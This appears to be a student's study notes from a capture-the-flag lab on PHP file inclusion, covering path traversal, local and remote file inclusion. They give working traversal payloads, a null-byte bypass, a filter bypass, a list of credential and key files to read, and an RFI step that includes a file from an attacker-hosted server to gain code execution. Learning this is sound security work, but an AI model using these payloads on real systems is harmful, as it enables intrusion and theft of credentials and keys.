# FILE INCLUSION 


## INTRODUCTION

- File inclusion vulnerabiity , is when a attacker can make the server execute his own files or traverse to the location withing the server which is not accesible by users

- There are 2 types :
    - LOCAL FILE INCLUSION
    - REMOTE FILE INCLUSION

- LFI -> The server fetches the data/files from its own locatioon 
- RFI -> Server executes the attackers files and this can lead to privilage escalation

- ex: `http://webapp.thm/get.php?file=userCV.pdf `

## PATH TRAVERSAL 

- The attacker can move from one directory to other .
- Also known as directory traversal

- `../` is used for moving up directory
    - EX: `http://webapp.thm/get.php?file=../../../../etc/passwd`
    - Here we are first moving back from the current directory via `../`
    - Once we reach `root`, we then traverse to `/etc/passwd`
    - If we dont know the path or where root is , we can use `../` many times as a guess before mentioning the `/etc/passwd`


- In PHP -> `file_get_content` causes path traversal vulnerability

- FOR LINUX, THESE PATH ARE IMP :
    - `/proc/version` --> specifies the version of the Linux kernel
    - `etc/passwd` --> has all registered users that have access to a system
    - `/etc/shadow` --> contains information about the system's users' passwords
    - `/root/.bash_history` --> contains the history commands for root user
    - `/root/.ssh/id_rsa` --> Private SSH keys for a root or any known valid user on the server
    - `/var/log/apache2/access.log` --> the accessed requests for Apache web server

- FOR WINIDOWS : ` C:\boot.ini` --> contains the boot options for computers with BIOS firmware

## LOCAL FILE INCLUSION

- Its same as path traversal .

- It happens in PHP When u use , `include`,`include_once`,`require`,`require_once`.

- LETS TAKE 2 EXAMPLES :

    1. Suppose the web application provides two languages, and the user can select between the EN and AR

    - `<?PHP

	        include($_GET["lang"]);

        ?>`


    - So, in this case,the actual URL is something like this :
        `http://webapp.thm/index.php?lang=EN.php`

    - Now we know the source code and also know that there is only `GET` method in  use
    - Henceforth i do the following :
        - `http://webapp.thm/index.php?lang=/etc/passwd`
    - Hence , this will take me to the file `passwd`

    - In this case, it works because there isn't a directory specified in the include function and no input validation.



    2. Now , the developer decided to specify the directory inside the function.

    - `<?PHP

	        include("languages/". $_GET['lang']); 
        
        ?>`

    - Now, here the developer added directory, so that user cant directly write `/etc/passwd` and access the folder.

    - So the attacker, in this case , will traverse first to the root directory and then access the passwd.

    - `http://webapp.thm/index.php?lang=../../../../etc/passwd`

    3. Sometimes, we get the error eve after doing the following:
    `http://webapp.thm/index.php?lang=../../../../etc/passwd`
        - This is because, the server want .php files
        - So in order to bypass this , we use NULLOPERATOR at the end of the URL, as follows:
        - `http://webapp.thm/index.php?lang=../../../../etc/passwd%00`

        - This `%00` will ignore the extension part.
        - But this is valid for PHP version below 5

    4. Sometimes, the developer filter `../`

    - In thi case, we can use `....//....//....//`, so here the filter will be done for thr first `../` and the other `../` wil be ignored, hence bypassiing the filter

    5. Finally, we'll discuss the case where the developer forces the include to read from a defined directory! 
    
    - For example, if the web application asks to supply input that has to include a directory such as:  `http://webapp.thm/index.php?lang=languages/EN.php` then, to exploit this, we need to include the directory in the payload like so: ?`lang=languages/../../../../../etc/passwd`.


## REMOTE FILE INCLUSINON

- Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. 

- The RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function.

- One requirement for RFI is that the `allow_url_fopen` option needs to be on

- RFI can lead to these :
    - Sensitive Information Disclosure
    - Cross-site Scripting (XSS)
    - Denial of Service (DoS)

- How to do this :

- So here, what we do is first create a .php file using nano or editor :
    - `nano hello.php`

- Then, we run an HTTP server using python:
    - `python3 -m http.server 8000`

- After this, we go to the URL of the website and do the following:
    - `http://webapp.thm/index.php?lang=http://attacker_ip.thm/hello.php`

- When it executes "Hello" on the browser, then its RFI and we can perfrome REMOTE CODE EXECUTION


## PRACTICAL

